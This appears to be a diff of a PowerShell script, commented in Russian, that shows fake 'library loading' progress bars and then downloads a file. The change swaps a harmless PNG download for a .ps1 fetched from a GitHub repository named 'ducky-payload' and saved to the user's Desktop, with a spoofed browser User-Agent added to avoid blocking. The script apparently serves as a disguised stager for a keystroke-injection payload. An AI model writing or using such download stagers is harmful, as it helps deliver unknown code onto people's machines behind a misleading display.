@@ -1,4 +1,4 @@
-# 1. Красивое появление (эмуляция загрузки библиотек)
+# 1. Красивая имитация загрузки библиотек
 $libs = @(
     "System.Net.Http.dll",
     "System.Security.Cryptography.dll",
@@ -7,7 +7,7 @@ $libs = @(
 )
 
 Write-Host "Инициализация среды..." -ForegroundColor DarkGray
-Start-Sleep -Milliseconds 500
+Start-Sleep -Milliseconds 800
 
 foreach ($lib in $libs) {
     Write-Host "Загрузка библиотеки: $lib ..." -ForegroundColor Cyan -NoNewline
@@ -18,21 +18,25 @@ foreach ($lib in $libs) {
         Write-Host "`r" -NoNewline
     }
     Write-Host " [■■■■■■■■■■] 100% - OK" -ForegroundColor Green
-    Start-Sleep -Milliseconds 200
+    Start-Sleep -Milliseconds 300
 }
 
-Write-Host "`nВсе библиотеки загружены. Начинаю скачивание файла..." -ForegroundColor Magenta
+Write-Host "`nВсе библиотеки загружены. Начинаю скачивание скрипта..." -ForegroundColor Magenta
 Start-Sleep -Seconds 1
 
-# 2. Сама загрузка файла (качаем безобидную картинку на Рабочий стол)
-$url = "https://raw.githubusercontent.com/github/explore/main/topics/powershell/powershell.png"
-$dest = "$env:USERPROFILE\Desktop\downloaded_file.png"
+# 2. Сама загрузка скрипта (качаем .ps1 на Рабочий стол)
+$url = "https://raw.githubusercontent.com/brotimofeenk-svg/ducky-payload/main/payload.ps1"
+$dest = "$env:USERPROFILE\Desktop\downloaded_script.ps1"
 
 try {
-    (New-Object System.Net.WebClient).DownloadFile($url, $dest)
-    Write-Host "Файл успешно скачан: $dest" -ForegroundColor Green
+    # Добавляем User-Agent, чтобы GitHub не блокировал запрос
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+    $wc.DownloadFile($url, $dest)
+    Write-Host "Скрипт успешно скачан: $dest" -ForegroundColor Green
 } catch {
     Write-Host "Ошибка скачивания: $_" -ForegroundColor Red
 }
 
-Start-Sleep -Seconds 2
+Write-Host "`nГотово. Нажмите Enter для выхода..."
+Read-Host
